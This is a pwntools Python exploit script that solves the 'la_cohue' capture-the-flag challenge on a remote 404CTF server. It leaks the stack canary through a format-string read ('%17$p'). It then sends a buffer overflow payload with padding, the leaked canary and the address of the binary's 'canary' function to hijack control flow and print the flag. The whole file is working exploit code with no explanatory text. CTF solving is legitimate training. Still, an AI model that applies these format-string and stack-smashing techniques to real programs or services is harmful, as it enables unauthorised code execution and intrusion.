#!/usr/bin/env python3

from pwn import *

elf = context.binary = ELF('./la_cohue')

#p = process()
p = remote('challenges.404ctf.fr', 30223)

p.clean()
p.sendline(b'2')
p.sendline(b'%17$p')
p.recvuntil(b'>>>')
canary = int(p.recvuntil(b'\n')[9:-1], 16)
log.info(f'canary: {hex(canary)}')

p.clean()
p.sendline(b'1')
p.clean()

payload = b'A'*72 + p64(canary) + b'\x90'*8 + p64(elf.symbols['canary'])

p.sendline(payload)
p.recvuntil(b'>>>')
p.sendline(b'3')

p.recvline()
print(p.recvline())
